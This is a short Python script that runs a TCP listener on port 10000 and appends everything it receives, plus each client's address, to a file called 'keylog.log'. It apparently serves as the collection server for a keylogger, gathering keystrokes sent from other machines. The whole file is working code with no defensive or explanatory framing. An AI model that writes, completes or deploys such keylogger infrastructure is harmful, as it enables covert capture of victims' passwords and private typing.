import socket


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


server_address = (socket.gethostbyname(socket.gethostname()), 10000)
sock.bind(server_address)


sock.listen(1)

while True:
    connection, client_address = sock.accept()

    with open("keylog.log", "a+") as log:
        log.write(f"Accepted Conection from {client_address}\n\n")
    
    try:
        while True:
            data = connection.recv(16)
            if data:
                with open("keylog.log", "a+") as log:
                    log.write(data.decode("utf-8"))
            else:
                break
    
    finally:
        connection.close()

sock.close()